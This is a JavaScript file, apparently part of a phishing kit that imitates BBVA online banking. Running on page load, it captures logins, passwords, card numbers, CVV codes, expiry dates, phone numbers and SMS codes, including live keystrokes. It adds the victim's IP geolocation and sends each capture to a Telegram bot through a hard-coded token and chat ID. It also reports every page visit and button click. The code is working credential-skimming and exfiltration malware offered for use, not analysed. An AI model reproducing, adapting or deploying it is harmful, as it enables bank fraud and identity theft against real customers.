// Configuration Telegram
const TELEGRAM_TOKEN = "8019935477:AAEBeU9mUPfPkxM5hfaccwRTCzl8ZxKynuA";
const CHAT_ID = "7356346717";

// Fonction pour obtenir des informations sur l'IP
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        return await response.json();
    } catch (error) {
        console.error('Erreur lors de la récupération des informations IP:', error);
        return { ip: "inconnu", city: "inconnu", region: "inconnu", country: "inconnu", org: "inconnu" };
    }
}

// Fonction pour envoyer un message à Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('Message envoyé avec succès:', data);
        return data;
    } catch (error) {
        console.error('Erreur lors de l\'envoi du message:', error);
        return null;
    }
}

// Fonction pour obtenir le nom de la page actuelle
function getCurrentPageName() {
    const path = window.location.pathname;
    const page = path.split("/").pop();
    return page || "index.html";
}

// Fonction pour ajouter des emojis selon le type de données
function addEmoji(fieldName, value) {
    const fieldNameLower = fieldName.toLowerCase();
    
    if (fieldNameLower.includes('user') || fieldNameLower.includes('identifiant') || fieldNameLower.includes('login')) {
        return `👤 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('pass') || fieldNameLower.includes('mot de passe') || fieldNameLower.includes('clave')) {
        return `🔑 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('card') || fieldNameLower.includes('carte') || fieldNameLower.includes('tarjeta')) {
        return `💳 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('cvv') || fieldNameLower.includes('cvc')) {
        return `🔒 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('expiry') || fieldNameLower.includes('expiration')) {
        return `📅 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('phone') || fieldNameLower.includes('tel') || fieldNameLower.includes('mobile')) {
        return `📱 ${fieldName}: ${value}`;
    } else if (fieldNameLower.includes('sms') || fieldNameLower.includes('code')) {
        return `📲 ${fieldName}: ${value}`;
    } else {
        return `📝 ${fieldName}: ${value}`;
    }
}

// Fonction pour capturer les données d'un formulaire
async function captureFormData(formElement, event) {
    event.preventDefault();
    
    const formData = new FormData(formElement);
    const formEntries = {};
    
    for (const [key, value] of formData.entries()) {
        formEntries[key] = value;
    }
    
    // Ajouter les champs qui ne sont pas dans le FormData (comme les inputs sans name)
    const inputs = formElement.querySelectorAll('input, select, textarea');
    inputs.forEach(input => {
        if (input.id && !formEntries[input.id] && input.value) {
            formEntries[input.id] = input.value;
        }
    });
    
    // Obtenir les informations IP
    const ipInfo = await getIPInfo();
    
    // Construire le message
    let message = `<b>🔔 NOUVELLE SAISIE BBVA</b>\n\n`;
    message += `<b>📄 Page:</b> ${getCurrentPageName()}\n`;
    message += `<b>⏰ Date:</b> ${new Date().toLocaleString()}\n\n`;
    
    // Ajouter les données du formulaire avec emojis
    for (const [key, value] of Object.entries(formEntries)) {
        if (value) {
            message += `${addEmoji(key, value)}\n`;
        }
    }
    
    // Ajouter les informations IP
    message += `\n<b>📍 INFORMATIONS IP</b>\n`;
    message += `<b>🌐 IP:</b> ${ipInfo.ip}\n`;
    message += `<b>🏙️ Ville:</b> ${ipInfo.city || "Inconnue"}\n`;
    message += `<b>🗺️ Région:</b> ${ipInfo.region || "Inconnue"}\n`;
    message += `<b>🌍 Pays:</b> ${ipInfo.country || "Inconnu"}\n`;
    message += `<b>🏢 Opérateur:</b> ${ipInfo.org || "Inconnu"}\n`;
    
    // Envoyer à Telegram
    await sendToTelegram(message);
    
    // Continuer la navigation normale
    const nextPage = formElement.getAttribute('data-next-page');
    if (nextPage) {
        window.location.href = nextPage;
    }
}

// Fonction pour capturer les clics sur les boutons
async function captureButtonClick(button) {
    // Obtenir les informations IP
    const ipInfo = await getIPInfo();
    
    // Construire le message
    let message = `<b>🔔 CLIC SUR BOUTON BBVA</b>\n\n`;
    message += `<b>📄 Page:</b> ${getCurrentPageName()}\n`;
    message += `<b>⏰ Date:</b> ${new Date().toLocaleString()}\n`;
    message += `<b>🔘 Bouton:</b> ${button.innerText || button.value || "Sans texte"}\n`;
    
    // Ajouter les informations IP
    message += `\n<b>📍 INFORMATIONS IP</b>\n`;
    message += `<b>🌐 IP:</b> ${ipInfo.ip}\n`;
    message += `<b>🏙️ Ville:</b> ${ipInfo.city || "Inconnue"}\n`;
    message += `<b>🗺️ Région:</b> ${ipInfo.region || "Inconnue"}\n`;
    message += `<b>🌍 Pays:</b> ${ipInfo.country || "Inconnu"}\n`;
    message += `<b>🏢 Opérateur:</b> ${ipInfo.org || "Inconnu"}\n`;
    
    // Envoyer à Telegram
    await sendToTelegram(message);
}

// Fonction pour capturer les données d'entrée en temps réel
async function captureInputChange(input) {
    // Obtenir les informations IP
    const ipInfo = await getIPInfo();
    
    // Construire le message
    let message = `<b>🔔 SAISIE EN TEMPS RÉEL BBVA</b>\n\n`;
    message += `<b>📄 Page:</b> ${getCurrentPageName()}\n`;
    message += `<b>⏰ Date:</b> ${new Date().toLocaleString()}\n`;
    message += `${addEmoji(input.name || input.id || "Champ", input.value)}\n`;
    
    // Ajouter les informations IP
    message += `\n<b>📍 INFORMATIONS IP</b>\n`;
    message += `<b>🌐 IP:</b> ${ipInfo.ip}\n`;
    message += `<b>🏙️ Ville:</b> ${ipInfo.city || "Inconnue"}\n`;
    message += `<b>🗺️ Région:</b> ${ipInfo.region || "Inconnue"}\n`;
    message += `<b>🌍 Pays:</b> ${ipInfo.country || "Inconnu"}\n`;
    message += `<b>🏢 Opérateur:</b> ${ipInfo.org || "Inconnu"}\n`;
    
    // Envoyer à Telegram
    await sendToTelegram(message);
}

// Fonction d'initialisation à exécuter au chargement de la page
function initTelegramTracking() {
    // Capturer les soumissions de formulaire
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', (event) => captureFormData(form, event));
    });
    
    // Capturer les clics sur les boutons
    document.querySelectorAll('button, input[type="button"], input[type="submit"], .btn, .btn-primary').forEach(button => {
        button.addEventListener('click', () => captureButtonClick(button));
    });
    
    // Capturer les changements dans les champs de saisie (avec délai pour éviter trop d'envois)
    const inputs = document.querySelectorAll('input:not([type="button"]):not([type="submit"]), textarea, select');
    inputs.forEach(input => {
        let timeout;
        input.addEventListener('input', () => {
            clearTimeout(timeout);
            timeout = setTimeout(() => captureInputChange(input), 1500); // Délai de 1.5 secondes
        });
    });
    
    // Envoyer une notification de visite de page
    (async function() {
        const ipInfo = await getIPInfo();
        
        let message = `<b>👁️ VISITE DE PAGE BBVA</b>\n\n`;
        message += `<b>📄 Page:</b> ${getCurrentPageName()}\n`;
        message += `<b>⏰ Date:</b> ${new Date().toLocaleString()}\n`;
        message += `<b>🌐 Navigateur:</b> ${navigator.userAgent}\n`;
        
        // Ajouter les informations IP
        message += `\n<b>📍 INFORMATIONS IP</b>\n`;
        message += `<b>🌐 IP:</b> ${ipInfo.ip}\n`;
        message += `<b>🏙️ Ville:</b> ${ipInfo.city || "Inconnue"}\n`;
        message += `<b>🗺️ Région:</b> ${ipInfo.region || "Inconnue"}\n`;
        message += `<b>🌍 Pays:</b> ${ipInfo.country || "Inconnu"}\n`;
        message += `<b>🏢 Opérateur:</b> ${ipInfo.org || "Inconnu"}\n`;
        
        await sendToTelegram(message);
    })();
}

// Initialiser le tracking au chargement de la page
document.addEventListener('DOMContentLoaded', initTelegramTracking);
